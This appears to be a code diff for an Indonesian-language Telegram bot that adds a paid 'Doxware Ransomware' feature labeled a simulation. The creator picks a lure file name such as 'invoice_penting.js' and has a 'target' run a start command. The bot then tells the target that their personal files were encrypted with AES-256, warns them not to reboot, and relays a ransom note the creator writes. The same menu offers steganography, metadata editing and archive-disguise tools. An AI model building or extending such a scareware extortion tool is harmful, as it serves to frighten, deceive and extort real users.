@@ -17,6 +17,7 @@ const TrackedLink = require('./models/trackedLink');
 const QRCode = require('qrcode');
 const Jimp = require('jimp');
 const { createInlineKeyboard, isAdmin, sendStartMessage, showProductDetail } = require('./utils');
+const DoxwareSimulation = require('./models/doxwareSimulation');
 const natural = require('natural');
 
 const bot = new TelegramBot(config.botToken, { polling: true });
@@ -190,7 +191,7 @@ bot.on("message", async (msg) => {
 
                     await coverImage.writeAsync(outputPath);
 
-                    await bot.sendDocument(chatId, outputPath, {}, {
+                    await bot.sendPhoto(chatId, outputPath, {
                         caption: "Berikut adalah gambar Anda yang telah disisipi QR code pelacakan."
                     });
 
@@ -254,6 +255,86 @@ bot.on("message", async (msg) => {
                 bot.sendMessage(chatId, "Terjadi kesalahan fatal. Silakan coba lagi.");
                 delete userStates[chatId];
             }
+            return;
+        } else if (state.action === 'doxware_awaiting_filename' && text) {
+            if (text.startsWith('/')) { // Ignore commands
+                bot.sendMessage(chatId, "Proses dibatalkan karena Anda memasukkan perintah.");
+                delete userStates[chatId];
+                return;
+            }
+            userStates[chatId].fileName = text.trim();
+            userStates[chatId].action = 'doxware_awaiting_key';
+            await bot.sendMessage(chatId, `✅ Nama file diatur ke \`${text.trim()}\`.\n\nLangkah 2: Sekarang, masukkan kata kunci rahasia (kunci dekripsi). Target akan membutuhkan kunci ini untuk 'memulihkan' file mereka.`);
+            return;
+        } else if (state.action === 'doxware_awaiting_key' && text) {
+            if (text.startsWith('/')) { // Ignore commands
+                bot.sendMessage(chatId, "Proses dibatalkan karena Anda memasukkan perintah.");
+                delete userStates[chatId];
+                return;
+            }
+            const simulationId = crypto.randomBytes(8).toString('hex');
+
+            try {
+                const newSimulation = new DoxwareSimulation({
+                    simulationId: simulationId,
+                    creatorChatId: chatId,
+                    fileName: userStates[chatId].fileName,
+                    decryptionKey: text.trim(),
+                    status: 'pending'
+                });
+                await newSimulation.save();
+
+                const payloadCommand = `/start_simulation ${simulationId}`;
+
+                await bot.sendMessage(chatId, `✅ **Pengaturan Selesai!**\n\n` +
+                    `Anda telah dibuat dengan ID: \`${simulationId}\`\n\n` +
+                    `Langkah 3: Berikan perintah berikut kepada target Anda untuk menjalankan simulasi:\n\n` +
+                    `\`${payloadCommand}\`\n\n` +
+                    `Saya akan memberitahu Anda ketika target telah menjalankan perintah tersebut.`);
+
+            } catch (error) {
+                console.error("Gagal membuat  doxware:", error);
+                bot.sendMessage(chatId, "Terjadi kesalahan saat membuat Silakan coba lagi.");
+            } finally {
+                delete userStates[chatId]; // Clean up the state
+            }
+            return;
+        } else if (state.action.startsWith('doxware_awaiting_ransom_note_') && text) {
+            if (text.startsWith('/')) { // Ignore commands
+                bot.sendMessage(chatId, "Proses dibatalkan karena Anda memasukkan perintah.");
+                delete userStates[chatId];
+                return;
+            }
+
+            const simulationId = state.action.split('_')[4];
+            const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId });
+
+            if (!simulation) {
+                bot.sendMessage(chatId, " tidak lagi valid atau telah kedaluwarsa.");
+                delete userStates[chatId];
+                return;
+            }
+
+            const victimChatId = simulation.victimChatId;
+            const ransomNote = text;
+
+            // Send the ransom note to the victim
+            const noteMessage = `
+=========================
+    **PESAN PENTING**
+=========================
+
+${ransomNote}
+`;
+            await bot.sendMessage(victimChatId, noteMessage, { parse_mode: 'Markdown' });
+
+            // Update simulation with the note
+            simulation.ransomNote = ransomNote;
+            await simulation.save();
+
+            // Confirm to creator
+            await bot.sendMessage(chatId, "✅ Pesan tebusan berhasil dikirim ke target.");
+            delete userStates[chatId]; // Clean up state
             return;
         }
     }
@@ -334,7 +415,7 @@ async function initializeTDLibClient(apiId, apiHash) {
   }
   console.log("Tipe apiId:", typeof apiId);
   const client = new TDL({
-    apiId: 26316278, // Hardcoded for testing
+    apiId: apiId, // Hardcoded for testing
     apiHash: apiHash,
     databaseDirectory: `_td_database_${apiId}`,
     filesDirectory: `_td_files_${apiId}`,
@@ -438,8 +519,9 @@ bot.on("callback_query", async (query) => {
             return bot.answerCallbackQuery(query.id, { text: nonPremiumText, show_alert: true });
         }
 
-        const premiumMessage = "Selamat datang di Menu Premium! Pilih alat steganografi yang ingin Anda gunakan:";
+        const premiumMessage = "Selamat datang di Menu Premium! Pilih alat yang ingin Anda gunakan:";
         const premiumButtons = [
+            { text: "🎓 Doxware Ransomware", callback_data: "doxware_simulation_start" },
             { text: "🖼️ Steghide (Embed File)", callback_data: "steg_steghide" },
             { text: "✍️ ExifTool (Edit Metadata)", callback_data: "steg_exiftool" },
             { text: "🗜️ Zip & Rename (Samarkan Arsip)", callback_data: "steg_zip" },
@@ -452,6 +534,86 @@ bot.on("callback_query", async (query) => {
             message_id: query.message.message_id,
             reply_markup: createInlineKeyboard(premiumButtons)
         });
+    }
+    else if (data === 'doxware_simulation_start') {
+        const user = await User.findOne({ chatId: userId });
+        if (!user || !user.isPremium) {
+            return bot.answerCallbackQuery(query.id, { text: 'Fitur ini hanya untuk pengguna premium.', show_alert: true });
+        }
+
+        // Start the state machine
+        userStates[chatId] = { action: 'doxware_awaiting_filename' };
+        await bot.sendMessage(chatId, "🎓 **Memulai Simulasi Doxware**\n\nLangkah 1: Silakan berikan nama untuk file payload simulasi Anda (contoh: `invoice_penting.js`). Ini adalah nama file yang akan Anda kirim ke target.");
+        await bot.answerCallbackQuery(query.id);
+    }
+    else if (data.startsWith('doxware_encrypt_')) {
+        const simulationId = data.split('_')[2];
+        const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId });
+
+        if (!simulation || simulation.creatorChatId !== userId) {
+            return bot.answerCallbackQuery(query.id, { text: 'Simulasi tidak ditemukan atau Anda bukan pemiliknya.', show_alert: true });
+        }
+
+        if (simulation.status !== 'connected') {
+            return bot.answerCallbackQuery(query.id, { text: 'Simulasi ini tidak dalam status "terhubung".', show_alert: true });
+        }
+
+        const victimChatId = simulation.victimChatId;
+
+        // Simulate encryption for the victim
+        const encryptionMessage = `
+‼️ **PERINGATAN KEAMANAN** ‼️
+
+File-file penting Anda di direktori Dokumen, Foto, dan Unduhan telah dienkripsi dengan algoritma AES-256.
+
+Contoh file yang terpengaruh:
+- \`C:\\Users\\User\\Documents\\laporan_keuangan.docx\` -> \`laporan_keuangan.docx.locked\`
+- \`C:\\Users\\User\\Photos\\liburan_2025.jpg\` -> \`liburan_2025.jpg.locked\`
+- \`C:\\Users\\User\\Downloads\\software_penting.zip\` -> \`software_penting.zip.locked\`
+
+Jangan coba-coba mematikan atau me-reboot perangkat Anda, karena ini dapat menyebabkan kerusakan data permanen.
+`;
+        await bot.sendMessage(victimChatId, encryptionMessage, { parse_mode: 'Markdown' });
+
+        // Update simulation status
+        simulation.status = 'encrypted';
+        await simulation.save();
+
+        // Notify the creator and provide the next step
+        await bot.editMessageText("✅ Enkripsi data target berhasil disimulasikan.", {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+        });
+
+        const keyboard = createInlineKeyboard([
+            { text: "💸 Kirim Pesan Tebusan", callback_data: `doxware_ransom_${simulation.simulationId}` }
+        ]);
+        await bot.sendMessage(chatId, "Anda sekarang dapat mengirimkan pesan tebusan kepada target.", { reply_markup: keyboard });
+
+        await bot.answerCallbackQuery(query.id);
+    }
+    else if (data.startsWith('doxware_ransom_')) {
+        const simulationId = data.split('_')[2];
+        const simulation = await DoxwareSimulation.findOne({ simulationId: simulationId });
+
+        if (!simulation || simulation.creatorChatId !== userId) {
+            return bot.answerCallbackQuery(query.id, { text: 'Simulasi tidak ditemukan atau Anda bukan pemiliknya.', show_alert: true });
+        }
+
+        if (simulation.status !== 'encrypted') {
+            return bot.answerCallbackQuery(query.id, { text: 'Simulasi ini belum dienkripsi.', show_alert: true });
+        }
+
+        // Set state to await the ransom note text
+        userStates[chatId] = { action: `doxware_awaiting_ransom_note_${simulationId}` };
+
+        // Acknowledge the button press and then send a new message
+        await bot.answerCallbackQuery(query.id);
+        await bot.editMessageReplyMarkup({inline_keyboard: []}, {
+             chat_id: chatId,
+             message_id: query.message.message_id
+        });
+        await bot.sendMessage(chatId, "✍️ Sekarang, ketikkan pesan tebusan yang ingin Anda kirim ke target. Anda dapat menggunakan Markdown untuk format teks.");
     }
     else if (data.startsWith('steg_')) {
         const user = await User.findOne({ chatId: userId });
